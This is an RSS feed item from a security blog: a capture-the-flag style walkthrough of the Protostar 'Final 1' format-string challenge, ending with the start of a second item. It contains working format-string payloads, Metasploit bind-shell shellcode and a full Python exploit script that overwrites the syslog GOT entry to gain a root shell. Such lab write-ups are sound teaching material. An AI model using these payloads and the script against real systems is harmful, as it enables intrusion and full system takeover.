<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Formatstring on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/formatstring/index.xml</link>
    <description>Recent content in Formatstring on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/formatstring/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Exploit Exercises - Protostar Final 1</title>
      <link>https://www.mattandreko.com/blog/2012-02-05-exploit-exercises-protostar-final-1/</link>
      <pubDate>Sun, 05 Feb 2012 15:15:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-02-05-exploit-exercises-protostar-final-1/</guid>
      <description>&lt;p&gt;Since I&amp;rsquo;ve been doing a lot of the format string exploits lately, I decided to do the &lt;a href=&#34;http://exploit-exercises.com/protostar/final1&#34;&gt;Final 1&lt;/a&gt; challenge.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We start out the challenge by being given the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;

#include &amp;lt;syslog.h&amp;gt;

#define NAME &amp;quot;final1&amp;quot;
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
 char buf[512];

 snprintf(buf, sizeof(buf), &amp;quot;Login from %s as [%s] with password [%s]\n&amp;quot;, hostname, username, pw);

 syslog(LOG_USER|LOG_DEBUG, buf);
}

void trim(char *str)
{
 char *q;

 q = strchr(str, &#39;\r&#39;);
 if(q) *q = 0;
 q = strchr(str, &#39;\n&#39;);
 if(q) *q = 0;
}

void parser()
{
 char line[128];

 printf(&amp;quot;[final1] $ &amp;quot;);

 while(fgets(line, sizeof(line)-1, stdin)) {
  trim(line);
  if(strncmp(line, &amp;quot;username &amp;quot;, 9) == 0) {
   strcpy(username, line+9);
  } else if(strncmp(line, &amp;quot;login &amp;quot;, 6) == 0) {
   if(username[0] == 0) {
    printf(&amp;quot;invalid protocol\n&amp;quot;);
   } else {
    logit(line + 6);
    printf(&amp;quot;login failed\n&amp;quot;);
   }
  }
  printf(&amp;quot;[final1] $ &amp;quot;);
 }
}

void getipport()
{
 int l;
 struct sockaddr_in sin;

 l = sizeof(struct sockaddr_in);
 if(getpeername(0, &amp;amp;sin, &amp;amp;l) == -1) {
  err(1, &amp;quot;you don&#39;t exist&amp;quot;);
 }

 sprintf(hostname, &amp;quot;%s:%d&amp;quot;, inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
 int fd;
 char *username;

 /* Run the process as a daemon */
 background_process(NAME, UID, GID); 

 /* Wait for socket activity and return */
 fd = serve_forever(PORT);

 /* Set the client socket to STDIN, STDOUT, and STDERR */
 set_io(fd);

 getipport();
 parser();

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After analyzing this for a while, I found that it was vulnerable in the logit() function.  If you had given it a username and went to login with a password, it would pass the &amp;ldquo;login&amp;rdquo; string directly to the &amp;ldquo;snprintf&amp;rdquo; funciton.  From there, we could do format string exploits.  There are probably more than one way to solve this, but my method involves overwriting the &amp;ldquo;syslog()&amp;rdquo; function with some shellcode inserted into the stack.&lt;/p&gt;

&lt;p&gt;I started to tinker with the app to see what I could do.  One thing I found really convenient, was to open another terminal throughout this entire process, and watch the syslog.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# tail -f /var/log/syslog | grep final1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This helps to see what is being passed, and align the format string later on.  It also notifies you when you crash the program, and dump the core.&lt;/p&gt;

&lt;p&gt;First, I needed to find the amount of words in the stack that I would need to skip over to get to my format string.  I found through some experimentation that it would start at 15 if I added a 1 character buffer (the &amp;ldquo;X&amp;rdquo;):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ nc localhost 2994
[final1] $ username XAAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
[final1] $ login B
login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 22:47:31 protostar final1: Login from 127.0.0.1:36764 as [JAAAA8049ee4.804a2a0.804a220.bffffc46.b7fd7ff4.bffffa98.69676f4c.7266206e.31206d6f.302e3732.312e302e.3736333a.61203436.4a5b2073.41414141] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Since my goal was to overwrite &amp;ldquo;syslog()&amp;rdquo; with a memory address pointing to my shellcode, I figured I probably needed to know the address of &amp;ldquo;syslog()&amp;rdquo; in the GOT.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -R final1 | grep syslog
0804a11c R_386_JUMP_SLOT   syslog
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My next step was to start using Direct Parameter Access, so my exploit wouldn&amp;rsquo;t be super long, and would be easier to deal with.  I also broke up the segments to make them easier for me to visualize.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;AAAA&amp;quot;.&amp;quot;BBBB&amp;quot;.&amp;quot;CCCC&amp;quot;.&amp;quot;DDDD&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:18:13 protostar final1: Login from 127.0.0.1:36768 as [XAAAABBBBCCCCDDDD41414141] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So there, I was still getting the &amp;ldquo;41414141&amp;rdquo; as the word being displayed.  When switched to &amp;ldquo;%n&amp;rdquo; instead of &amp;ldquo;%x&amp;rdquo;, that&amp;rsquo;ll be the address written to.  The next thing to do, would be make all 4 words show up properly.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;AAAA&amp;quot;.&amp;quot;BBBB&amp;quot;.&amp;quot;CCCC&amp;quot;.&amp;quot;DDDD&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;%16\$x&amp;quot;.&amp;quot;%17\$x&amp;quot;.&amp;quot;%18\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:23:17 protostar final1: Login from 127.0.0.1:36769 as [XAAAABBBBCCCCDDDD41414141424242424343434344444444] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So you can see, it is now displaying the 4 words that are needed to be overwritten, &amp;ldquo;41414141&amp;rdquo;, &amp;ldquo;42424242&amp;rdquo;, &amp;ldquo;43434343&amp;rdquo;, and &amp;ldquo;44444444&amp;rdquo;.  If the address of &amp;ldquo;syslog()&amp;rdquo; (0x0804a11c) in the GOT is used, instead of these addresses, we can achieve an overwrite of &amp;ldquo;syslog()&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Just to double-check, I put in the new addresses without the &amp;ldquo;%n&amp;rdquo; so that I could verify nothing was messed up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$x&amp;quot;.&amp;quot;%16\$x&amp;quot;.&amp;quot;%17\$x&amp;quot;.&amp;quot;%18\$x&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:27:12 protostar final1: Login from 127.0.0.1:36770 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010804a11c804a11d804a11e804a11f] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Towards the end, you can see all the memory addresses being written out.&lt;/p&gt;

&lt;p&gt;The next logical step would be to replace the &amp;ldquo;%x&amp;rdquo; with &amp;ldquo;%n&amp;rdquo;, and watch the program crash, as we try to write arbitrary values to the &amp;ldquo;syslog()&amp;rdquo; memory space before it gets called.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin B\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:30:50 protostar final1: Login from 127.0.0.1:36772 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [B]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is not at all what I was expecting!  No crash, it tried to do the login.  But wait!  If I tried to continue sending commands in that same session, it seemed to have been messed up, since it does not even function properly, outputting the &amp;ldquo;[final1] $&amp;rdquo; string:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[final1] $ username A
login B
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I figured that maybe I had crashed it, and a core had been dumped.  But nothing appeared:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ls /tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I started tinkering, and decided to try having it login a second time, repeating the &amp;ldquo;login&amp;rdquo; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin B\nlogin TEST2\n&amp;quot;&#39; | nc localhost 2994
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  4 23:37:49 protostar final1: Login from 127.0.0.1:36773 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [B]
Feb  4 23:37:49 protostar kernel: [984582.054370] final1[24813]: segfault at 30303030 ip 30303030 sp bffff9fc error 4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There we go, we have a segfault, which should have dumped a core for us to debug.  This is convenient, since if the overwrite of &amp;ldquo;syslog()&amp;rdquo; doesn&amp;rsquo;t happen until the second login attempt, we&amp;rsquo;ll need to know where &amp;ldquo;TEST2&amp;rdquo; was in memory, to inject shellcode.  NOTE: To debug in gdb, you will have to use the root login.  Per &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;http://exploit-exercises.com/protostar&lt;/a&gt; &amp;ldquo;For debugging the final levels, you can log in as root with password &amp;ldquo;godmode&amp;rdquo; (without the quotes)&amp;ldquo;.&lt;/p&gt;

&lt;p&gt;This also made me remember, that since we are going to put shellcode in where &amp;ldquo;TEST2&amp;rdquo; is, the stack address will change, since the shellcode will probably be more than 5 characters long.  So this needs to be done again with a proper length shellcode.  That means the first step towards getting this, should be generating some shellcode.  I connected to a machine with the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&lt;/a&gt; installed, and generated some:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfpayload linux/x86/shell_bind_tcp c
/*
* linux/x86/shell_bind_tcp - 78 bytes
* http://www.metasploit.com
* VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false,
* PrependSetreuid=false, PrependSetuid=false,
* PrependChrootBreak=false, AppendExit=false,
* InitialAutoRunScript=, AutoRunScript=
*/
unsigned char buf[] =
&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot;
&amp;quot;\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot;
&amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot;
&amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot;
&amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot;
&amp;quot;\x0b\xcd\x80&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I wired up a new string to send to the program, using the username of the exploit format string for the first username, and a &amp;ldquo;B&amp;rdquo; for the password.  The second login attempt would set the username to &amp;ldquo;X&amp;rdquo;, as to not trigger the format string again, and a password containing a fake shellcode, of 78 &amp;ldquo;A&amp;rdquo;s.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%15\$n&amp;quot;.&amp;quot;%16\$n&amp;quot;.&amp;quot;%17\$n&amp;quot;.&amp;quot;%18\$n&amp;quot;.&amp;quot;\nlogin &amp;quot;.&amp;quot;B&amp;quot;x120 .&amp;quot;username X\nlogin &amp;quot;.&amp;quot;A&amp;quot;x78 .&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  5 00:03:58 protostar final1: Login from 127.0.0.1:36775 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010] with password [Busername X]
Feb  5 00:03:58 protostar kernel: [986148.949635] final1[24854]: segfault at 30303030 ip 30303030 sp bffff9fc error 4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now to debug as root, to find the start of the shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ su
Password:
root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24854
Core was generated by `/opt/protostar/bin/final1&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x30303030 in ?? ()
(gdb) x/10s $esp
0xbffff9fc:      &amp;quot;\357\230\004\b\017&amp;quot;
0xbffffa02:      &amp;quot;&amp;quot;
0xbffffa03:      &amp;quot;&amp;quot;
0xbffffa04:      &amp;quot; \372\377\277\344\236\004\b\240\242\004\b \242\004\bF\374\377\277\364\177\375\267\230\372\377\277Login from 127.0.0.1:36775 as [X\034\241\004\b\035\241\004\b\036\241\004\b\037\241\004\b%15$n%16$n%17$n%18$n] with password [&amp;quot;, &#39;A&#39; &amp;lt;repeats 78 times&amp;gt;, &amp;quot;]\n&amp;quot;
0xbffffac6:      &amp;quot;\377\277(\033\376\267\021&amp;quot;
0xbfffface:      &amp;quot;&amp;quot;
0xbffffacf:      &amp;quot;&amp;quot;
0xbffffad0:      &amp;quot;\024\310\351\267\374\032\376\267\021{\234|\001&amp;quot;
0xbffffade:      &amp;quot;&amp;quot;
0xbffffadf:      &amp;quot;&amp;quot;
(gdb) x/1s 0xbffffac6-81
0xbffffa75:      &#39;A&#39; &amp;lt;repeats 78 times&amp;gt;, &amp;quot;]\n&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now we know that we should be able to overwrite 0x0804a11c with 0xbffffa75 to make &amp;ldquo;syslog()&amp;rdquo; call our shellcode.  We just need to calculate the buffer lengths to get &amp;ldquo;0xbrffffa75&amp;rdquo; to actually show up instead of &amp;ldquo;0x30303030&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p 0x75 - 0x30
$1 = 69
(gdb) p 0xfa - 0x75
$2 = 133
(gdb) p 0xff - 0xfa
$3 = 5
(gdb) p 0x1ff - 0xfa
$4 = 261
(gdb) p 0xbf - 0xff
$5 = -64
(gdb) p 0x1bf - 0xff
$6 = 192
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This tells us, that with our 4 &amp;ldquo;%n&amp;rdquo;s, we should be able to use buffer lengths of 69, 133, 261, and 192.  So let&amp;rsquo;s wire that up:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%69x%15\$n&amp;quot;.&amp;quot;%133x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;A&amp;quot;x78 .&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  5 00:14:14 protostar final1: Login from 127.0.0.1:36776 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010                                                              8049ee4                                                                                                                              804a2a0                                                                                                                                                                                                                                                              804a220                                                                                                                                                                                        bffffc46] with password [Busername X]
Feb  5 00:14:14 protostar kernel: [986763.710440] final1[24875]: segfault at 69 ip bffffa78 sp bffffa00 error 6
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we launch gdb again, we can see where it crashed, and cross our fingers that it was when trying to execute our fake shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ su
Password:
root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24875
Core was generated by `/opt/protostar/bin/final1&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xbffffa78 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It would appear that our assumption was correct.  It tried to run starting at 0xbffffa75, and made it to 0xbffffa78 before segfaulting.  Let&amp;rsquo;s now replace the fake shellcode with real shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%69x%15\$n&amp;quot;.&amp;quot;%133x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;.&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, this appeared to segfault as well, based on the syslog output, so again, I loaded it in gdb:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/opt/protostar/bin# gdb --quiet --core=/tmp/core.11.final1.24894
Core was generated by `/opt/protostar/bin/final1&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xbffffa78 in ?? ()
(gdb) x/1x 0x0804a11c
0x804a11c:      0xbffffa75
(gdb) x/1s 0xbffffa75
0xbffffa75:      &amp;quot;$n] with password [1\333\367\343SCSj\002\211\341\260fÍ[^Rh\377\002\021\\j\020QP\211\341jfXÍ\211A\004\263\004\260fÍC\260fÍ\223Yj?XÍIy\370h//shh/bin\211\343PS\211\341\260\vÍ]\n&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;First, I made sure that the address of the &amp;ldquo;syslog()&amp;rdquo; function in the GOT was overwritten by the correct address, which it was.  I then realized that the length was off, since I changed the buffers to output the address.  This means the address would have to change, and the buffers as well again.  So I found the shellcode, and corrected the address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) x/8x 0xbffffa75+19
0xbffffa88:     0xe3f7db31      0x6a534353      0xb0e18902      0x5b80cd66
0xbffffa98:     0xff68525e      0x6a5c1102      0x89505110      0x58666ae1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It now needs to jump to 0xbffffa88&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) p 0x88 - 0x30
$1 = 88
(gdb) p 0xfa - 0x88
$2 = 114
(gdb) p 0xff - 0xfa
$3 = 5
(gdb) p 0x1ff - 0xfa
$4 = 261
(gdb) p 0xbf - 0xff
$5 = -64
(gdb) p 0x1bf - 0xff
$6 = 192
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So our new buffer offsets should be 88, 114, 261, and 192:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;username &amp;quot;.&amp;quot;X&amp;quot;.&amp;quot;\x1c\xa1\x04\x08&amp;quot;.&amp;quot;\x1d\xa1\x04\x08&amp;quot;.&amp;quot;\x1e\xa1\x04\x08&amp;quot;.&amp;quot;\x1f\xa1\x04\x08&amp;quot;.&amp;quot;%88x%15\$n&amp;quot;.&amp;quot;%114x%16\$n&amp;quot;.&amp;quot;%261x%17\$n&amp;quot;.&amp;quot;%192x%18\$n&amp;quot;.&amp;quot;\nlogin B&amp;quot;.&amp;quot;username X\nlogin &amp;quot;.&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;.&amp;quot;\n&amp;quot;&#39; | nc localhost 2994
[final1] $ [final1] $ login failed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the syslog, this showed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Feb  5 00:27:15 protostar final1: Login from 127.0.0.1:36781 as [X#034¡#004#010#035¡#004#010#036¡#004#010#037¡#004#010                                                                                 8049ee4                                                                                                           804a2a0                                                                                                                                                                                                                                                              804a220                                                                                                                                                                                        bffffc46] with password [Busername X]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No segfault means maybe it worked.  Let&amp;rsquo;s attempt to connect on port 4444:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ nc localhost 4444
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it, root access!  However, this only works on the local machine, since the syslog string contaisn your ip address and port that you used to connect.  This means that if you connect from outside hosts, the format string will be wrong.  I decided to fix this, by writing this out as a &amp;ldquo;true&amp;rdquo; exploit, instead of just a perl pipe.  This was both for fun, and to try getting better at writing actual &amp;ldquo;exploits&amp;rdquo; that I could publish.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python

# Protostar Final 1 Exploit
# http://exploit-exercises.com/protostar/final1
# Matt Andreko
# twitter: @mandreko
# contact: matt [at] mattandreko.com

from socket import *
from struct import *
from optparse import OptionParser

def exploit(host, port):
    syslog_address = 0x0804a11c
    syslog_address_1 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address)
    syslog_address_2 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 1)
    syslog_address_3 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 2)
    syslog_address_4 = pack(&amp;quot;&amp;lt;I&amp;quot;, syslog_address + 3)

    # linux/x86/shell_bind_tcp - 78 bytes
    # http://www.metasploit.com
    # VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false,
    # PrependSetreuid=false, PrependSetuid=false,
    # PrependChrootBreak=false, AppendExit=false,
    # InitialAutoRunScript=, AutoRunScript=
    shellcode = &amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot; \
                &amp;quot;\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot; \
                &amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot; \
                &amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot; \
                &amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot; \
                &amp;quot;\x0b\xcd\x80&amp;quot;

    # Open the connection
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))

    # Because the string in the syslog varies, due to it showing &amp;quot;Login from 192.168.1.1:19661&amp;quot; for example
    # Calculate length of junk filler, based on max ip+port combo being 255.255.255.255:65535
    # Write out 0xbffffc46 (start of shellcode) to 0x0804a11c (GOT of syslog)
    source_address = s.getsockname()[0]
    source_port = s.getsockname()[1]
    source_string = str(source_address) + &amp;quot;:&amp;quot; + str(source_port)

    junk_buffer_length = 21 - len(source_string)

    print(&amp;quot;[*] Sending format string as username&amp;quot;)
    s.send(&amp;quot;username XXX&amp;quot; + &amp;quot;X&amp;quot;*junk_buffer_length + syslog_address_1 + syslog_address_2 + syslog_address_3 + syslog_address_4 + &amp;quot;%14x%17$n&amp;quot; + &amp;quot;%182x%18$n&amp;quot; + &amp;quot;%259x%19$n&amp;quot; + &amp;quot;%192x%20$n&amp;quot; + &amp;quot;\n&amp;quot;)

    print(&amp;quot;[*] Sending password to trigger formatstring&amp;quot;)
    s.send(&amp;quot;login &amp;quot; + &amp;quot;B&amp;quot; + &amp;quot;\n&amp;quot;)

    print(&amp;quot;[*] Sending new username without format string&amp;quot;)
    s.send(&amp;quot;username X\n&amp;quot;)

    print(&amp;quot;[*] Sending shellcode as password&amp;quot;)
    s.send(&amp;quot;login &amp;quot; + shellcode + &amp;quot;\n&amp;quot;)

    s.close

    print(&amp;quot;[*] Exploit successfull! Now launch: nc &amp;quot; + str(host) + &amp;quot; 4444&amp;quot;)
    
if __name__ == &amp;quot;__main__&amp;quot;:
    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to exploit&amp;quot;)
    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2994, type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)

    (options, args) = parser.parse_args()
    
    exploit(options.hostname, options.portnum)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 4</title>
      <link>https://www.mattandreko.com/blog/2012-02-02-exploit-exercises-protostar-format-4/</link>
      <pubDate>Thu, 02 Feb 2012 05:15:00 -0500</pubDate>
      
